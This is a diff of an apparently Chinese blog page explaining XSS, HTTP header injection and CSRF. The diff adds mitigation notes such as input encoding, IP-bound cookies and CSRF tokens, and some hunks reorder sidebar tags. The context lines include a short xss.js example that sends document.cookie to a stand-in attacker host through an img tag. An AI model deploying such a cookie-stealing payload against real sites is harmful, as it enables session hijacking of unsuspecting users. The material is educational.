@@ -328,18 +328,19 @@
 <pre><code>   1. 利用虚假输入表单骗取用户个人信息
    2. 利用脚本窃取用户的Cookie值， 被害者在不知情的情况下帮助攻击者发送恶意请求
    3. 显示伪造的文章或者图片
+防止方法： 首先对于用户的输入进行encode编码，或者标签过滤或者将输入的标签进行xss转换，避免在cookie中添加用户个人信息，尽量采用post传输数据而不是get，
 
 跨站脚本攻击的案例：
   在表单中设入的圈套：
          1、在输入用户信息的时候，可能输入含有恶意的HTML标签， 动态生成HTML处发生
-         2.某些网站通过URL中的查询字段来指定表单用户的ID,  攻击者在这个URL后面嵌入恶意代码的URL,这段URL包含脚本， 那么在浏览器打开该URL后， 设置好的脚本会运行，将用户输入的认证信息发送到攻击者网站
+         2.某些网站通过URL中的查询字段来指定表单用户的ID,  攻击者在这个URL后面嵌入恶意代码的URL,这段URL包含脚本， 那么在浏览器打开该URL后， 设置好的脚本会运行，将用户输入的认证信息发送到攻击者网站，将cookie于ip地址绑定，这样窃取到cookie后也没用。
   对用户Cookie信息的获取:
        在脚本内嵌入指定的xss.js 文件
        该文件定义如下:
        <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var content = escape(document.cookie);</div><div class="line">document.write(<span class="string">'&lt;img src = http://hackr.js/?&gt;'</span>);</div><div class="line">document.write(content);</div><div class="line">document.write(<span class="string">'&gt;'</span>);</div></pre></td></tr></table></figure>
 
       在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段js代码， 即可访问该域名下的Cookie信息， 然后将这些信息发送至攻击者的Web网站， 记录在它的登陆日志中
-</code></pre><p>   2.2 HTTP首部注入攻击<br>        是指攻击者通过响应首部字段内插入换行，添加任意响应首部或者主体的一种攻击模式，可能造成的影响: 设置任意的Cookie信息， 重定向至任意的URL, 显示任意的主体（向首部主体内添加内容– HTTP响应式截断效应）<br>   2.3 跨站点请求伪造攻击(CSRF)是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或车顶信息等某些状态的更新,就是说用户在已登录的情况下访问了危险网站，这时候危险网站就能获取你的cookie，截取你的登陆信息获得你的登陆权限，从而做一些不好的事情。</p>
+</code></pre><p>   2.2 HTTP首部注入攻击<br>        是指攻击者通过响应首部字段内插入换行，添加任意响应首部或者主体的一种攻击模式，可能造成的影响: 设置任意的Cookie信息， 重定向至任意的URL, 显示任意的主体（向首部主体内添加内容– HTTP响应式截断效应）<br>   2.3 跨站点请求伪造攻击(CSRF)是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或车顶信息等某些状态的更新,就是说用户在已登录的情况下访问了危险网站，这时候危险网站就能获取你的cookie，截取你的登陆信息获得你的登陆权限，从而做一些不好的事情，防止方法可以：1。为cookie添加随机token或者通过验证码的方式。</p>
 
       
 
@@ -998,11 +999,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">ajax</a>
+                <a href="javascript:void(0)" class="js-tag color3">http 缓存</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">http 缓存</a>
+                <a href="javascript:void(0)" class="js-tag color5">ajax</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1030,11 +1031,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">js 笔试</a>
+                <a href="javascript:void(0)" class="js-tag color4">算法  动态规划</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">算法  动态规划</a>
+                <a href="javascript:void(0)" class="js-tag color1">js 笔试</a>
               </li>
              
               <li class="article-tag-list-item">
